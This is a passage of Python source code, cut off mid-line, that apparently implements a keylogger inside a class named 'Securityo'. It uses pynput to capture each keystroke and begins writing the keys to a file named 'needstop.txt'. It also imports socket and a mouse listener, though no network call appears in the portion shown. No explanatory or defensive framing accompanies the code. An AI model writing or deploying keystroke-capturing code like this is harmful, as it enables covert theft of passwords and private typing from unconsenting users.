import socket
import _thread
from threading import Thread, Lock
import sys
from pynput import keyboard, mouse

from config import *
from keys import *

from motion import Motion

from time import sleep
from random import randint
from datetime import datetime, timedelta


class Securityo(Thread):
    def __init__(self):
        Thread.__init__(self)
        self.ruuning = True
        self.security()


    def security(self):
        def keylog(key):
            try:
                if key.char != "":
                    print('alphanumeric key {0} pressed'.format(key.char))
                    newkey = key.char
                elif key.name == "space":
                    print('space bar pressed')
                    newkey = " "
                elif key.name == "enter":
                    print('enter key pressed')
                    newkey = "[enter]"
                else:
                    print('special key {0} pressed'.format(
                        key.name))
                    newkey = key.name
                with open("needstop.txt", "
